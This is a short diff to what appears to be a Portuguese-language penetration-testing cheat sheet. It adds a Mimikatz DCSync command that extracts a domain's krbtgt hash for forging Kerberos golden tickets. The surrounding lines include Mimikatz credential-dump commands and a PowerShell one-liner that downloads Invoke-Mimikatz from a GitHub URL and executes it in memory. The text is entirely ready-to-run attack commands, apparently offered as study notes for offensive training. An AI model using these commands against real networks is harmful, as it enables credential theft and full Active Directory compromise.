@@ -1247,6 +1247,11 @@ Invoke-Mimikatz
 privilege::debug
 lsadump::lsa /patch
 ```
+##### GOLDEN TICKET MIMIKATZ - PEGAR O HASH DE KRBTGT (COMO ADMIN MAS TERMINAM NORMAL):
+```
+Invoke-Mimikatz
+lsadump::dcsync /user:tech\krbtgt
+```
 ##### GOLDEN TICKET MIMIKATZ - GERAR TICKET P QQ USUARIO EM QQ MAQUINA (TERMINAL NORMAL):
 ```
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
